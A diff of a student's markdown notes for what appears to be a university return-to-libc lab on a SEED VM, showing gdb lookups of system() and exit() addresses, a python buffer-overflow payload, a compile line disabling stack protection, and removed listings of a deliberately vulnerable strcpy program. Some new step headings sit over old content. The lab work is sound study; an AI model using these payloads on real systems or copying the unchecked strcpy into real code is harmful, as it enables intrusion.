@@ -17,15 +17,20 @@
 [02/23/22]seed@VM:Byeongchan$
 
 ```
++ Make sure not using stack executable when compiling c file
+```
+gcc -g -static -fno-stack-protector ans_check7.c -o ans_check7_static
+```
 
 ## Steps
-1. Find out how many bytes we need for the padding.
-2. Find out the address of the system function
-3. Find out the address of the exit function
-4. Find out the address of the '/bin/bash' string in the env variables
-5. Make the payload and execute
+1,2,3,4 - Have done on previous lab
+5. Find out the address of the strcpy & pop-pop-ret function
+6. Choose an address for our string destination
+7. Find out where hexacode of strings are.(We're using them to build our own command)
+8. Build the command text we're using
+9. Make the payload and execute
 
-### Step1 - Find out how many bytes we need for the padding.
+### Step5 - Find out the address of the strcpy & pop-pop-ret function
 + I found the 54 bytes are needed for the padding using exit function
 + If you're not sure what it does, look back previous practice
 ```
@@ -33,7 +38,7 @@
 ```
 
 
-### Step2 - Find out the address of the system function
+### Step6 - Choose an address for our string destination
 + Address of system() : 0xb7da4da0
 + I tried to find the system in the program, but it ended with ‘00’ so I tried to find another one using gdb.
 ```
@@ -58,7 +63,7 @@ $1 = {<text variable, no debug info>} 0xb7da4da0 <__libc_system>
 gdb-peda$
 ```
 
-### Step3 - Find out the address of the exit function
+### Step7 - Find out where hexacode of strings are.(We're using them to build our own command)
 + Address of exit() : 0xb7d989d0
 + This time, I just using gdb method very first.
 ```
@@ -75,7 +80,7 @@ gdb-peda$ p exit
 $1 = {<text variable, no debug info>} 0xb7d989d0 <__GI_exit>
 ```
 
-### Step4 - Find out the address of the '/bin/bash' string in the env variables
+### Step8 - Build the command text we're using
 + The address of cmd_string: 0xbffff0d3
 + Repeatable note is here
 ```
@@ -87,7 +92,7 @@ $1 = {<text variable, no debug info>} 0xb7d989d0 <__GI_exit>
 [02/23/22]seed@VM:Byeongchan$
 ```
 
-### Step5 - Make the payload and execute
+### Step9 - Make the payload and execute
 + The payload I made is shown below
 + &system:  0xb7da4da0 <__libc_system>
 + &exit_path: b7d989d0 <__GI_exit>
@@ -107,55 +112,3 @@ $(python -c "print '\xAA'*54 + '\xa0\x4d\xda\xb7' + '\xd0\x89\xd9\xb7' + '\xd3\x
 ![lab5_1](https://raw.githubusercontent.com/kbckbc/washu_sp22_cse523/main/img/lab5_1.png)
 
 
-## ans_check7.c
-+ Compile this program with option like this : gcc -g -m32 -fno-stack-protector ans_check7.c -o ans_check7
-```
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-
-int check_answer(char *ans) {
-
-  int ans_flag = 0;
-  char ans_buf[38];
-
-  strcpy(ans_buf, ans);
-
-  if (strcmp(ans_buf, "forty-two") == 0)
-    ans_flag = 1;
-
-  return ans_flag;
-
-}
-
-int main(int argc, char *argv[]) {
-
-  if (argc < 2) {
-    printf("Usage: %s <answer>\n", argv[0]);
-    exit(0);
-  }
-
-  if (check_answer(argv[1])) {
-    printf("Right answer!\n");
-  } else {
-    printf("Wrong answer!\n");
-  }
-  printf("About to exit!\n");
-  fflush(stdout);
-  system("/bin/date");
-}
-```
-
-## find_var.c
-+ This program shows the address of 'SHELL' env variable.
-```
-#include <stdio.h>
-#include <stdlib.h>
-int main(int argc, char *argv[])
-{
-   if(!argv[1])
-  	exit(1);
-   printf("%p\n", getenv(argv[1]));
-   return 0;
-}
-```
